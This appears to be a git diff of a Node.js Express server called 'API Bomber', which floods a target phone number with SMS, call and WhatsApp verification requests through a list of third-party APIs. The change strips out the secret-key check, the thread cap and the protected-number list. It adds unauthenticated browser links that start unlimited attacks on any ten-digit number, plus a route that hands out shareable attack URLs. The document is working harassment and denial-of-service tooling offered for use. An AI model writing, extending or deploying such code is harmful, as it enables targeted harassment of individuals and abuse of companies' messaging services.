@@ -1,4 +1,4 @@
-// API Bomber - Single File Vercel Deployment
+// API Bomber - Direct Browser Attack
 // @HeX_CiPhEr | Fsociety
 
 const express = require('express');
@@ -10,10 +10,8 @@ app.use(cors());
 app.use(express.json());
 
 // ==================== CONFIG ====================
-const MAX_THREADS = 100;
 const RATE_LIMIT_SECONDS = 10;
 const userLastRequest = {};
-const protectedNumbers = [];
 
 // ==================== 150+ APIS ====================
 const APIS = [
@@ -156,11 +154,18 @@ async function sendRequest(api, phone) {
   }
 }
 
-async function runBomber(phone, duration = 60) {
-  const endTime = Date.now() + (duration * 1000);
+// ==================== MAIN BOMBER (Unlimited) ====================
+async function runBomber(phone, duration = 0) {
+  const startTime = Date.now();
   let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
   const formats = getFormats(phone);
-  while (Date.now() < endTime) {
+  
+  // Run until user stops (duration 0 = unlimited)
+  while (true) {
+    // If duration is set and time is up, stop
+    if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
+      break;
+    }
     const api = randomItem(APIS);
     const result = await sendRequest(api, randomItem(formats));
     if (result.status && [200, 201, 202, 204].includes(result.status)) {
@@ -176,29 +181,106 @@ async function runBomber(phone, duration = 60) {
 }
 
 // ==================== ROUTES ====================
+
+// Health Check
 app.get('/', (req, res) => {
-  res.json({ status: 'online', name: 'API Bomber', apis: APIS.length, author: '@HeX_CiPhEr' });
+  res.json({ 
+    status: 'online', 
+    name: 'API Bomber', 
+    apis: APIS.length, 
+    author: '@HeX_CiPhEr',
+    note: 'Use /start/:phone to attack'
+  });
 });
 
-app.post('/attack', async (req, res) => {
-  const { phone, duration = 60, secret } = req.body;
-  if (secret !== 'fsociety') return res.status(401).json({ error: 'Invalid secret' });
-  if (!phone || !phone.match(/^\d{10}$/)) return res.status(400).json({ error: 'Invalid phone' });
+// START ATTACK - Direct Browser (UNLIMITED)
+app.get('/start/:phone', async (req, res) => {
+  const phone = req.params.phone;
+  if (!phone || !phone.match(/^\d{10}$/)) {
+    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
+  }
+  
+  // Rate limit check
   const now = Date.now();
   if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
-    return res.status(429).json({ error: `Wait ${RATE_LIMIT_SECONDS}s`, wait: RATE_LIMIT_SECONDS });
+    return res.json({ 
+      error: `Rate limited. Wait ${RATE_LIMIT_SECONDS}s`,
+      wait: RATE_LIMIT_SECONDS,
+      phone: phone
+    });
   }
   userLastRequest[phone] = now;
+  
+  // Start attack (duration 0 = unlimited)
   try {
-    const results = await runBomber(phone, duration);
-    res.json({ success: true, target: phone, duration, stats: results });
+    const results = await runBomber(phone, 0);
+    res.json({
+      success: true,
+      target: phone,
+      duration: 'Unlimited',
+      stats: results,
+      note: 'Attack running. Refresh page to stop.'
+    });
   } catch (error) {
-    res.status(500).json({ error: 'Attack failed' });
+    res.json({ success: false, error: 'Attack failed' });
   }
 });
 
-app.get('/status', (req, res) => {
-  res.json({ status: 'ready', apis_loaded: APIS.length, rate_limit: RATE_LIMIT_SECONDS });
+// START ATTACK with Duration
+app.get('/start/:phone/:duration', async (req, res) => {
+  const phone = req.params.phone;
+  const duration = parseInt(req.params.duration) || 60;
+  if (!phone || !phone.match(/^\d{10}$/)) {
+    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
+  }
+  
+  const now = Date.now();
+  if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
+    return res.json({ 
+      error: `Rate limited. Wait ${RATE_LIMIT_SECONDS}s`,
+      wait: RATE_LIMIT_SECONDS,
+      phone: phone
+    });
+  }
+  userLastRequest[phone] = now;
+  
+  try {
+    const results = await runBomber(phone, duration);
+    res.json({
+      success: true,
+      target: phone,
+      duration: duration + 's',
+      stats: results
+    });
+  } catch (error) {
+    res.json({ success: false, error: 'Attack failed' });
+  }
+});
+
+// Status endpoint
+app.get('/status/:phone', (req, res) => {
+  const phone = req.params.phone;
+  if (!phone || !phone.match(/^\d{10}$/)) {
+    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
+  }
+  res.json({
+    status: 'ready',
+    target: phone,
+    attack_link: `https://bomber-hex-osint.vercel.app/start/${phone}`,
+    duration_link: `https://bomber-hex-osint.vercel.app/start/${phone}/60`,
+    note: 'Open link in browser to start attack'
+  });
+});
+
+// Stop attack (by clearing rate limit)
+app.get('/stop/:phone', (req, res) => {
+  const phone = req.params.phone;
+  if (userLastRequest[phone]) {
+    delete userLastRequest[phone];
+    res.json({ success: true, message: `Attack stopped for ${phone}` });
+  } else {
+    res.json({ success: false, message: 'No active attack for this number' });
+  }
 });
 
 module.exports = app;
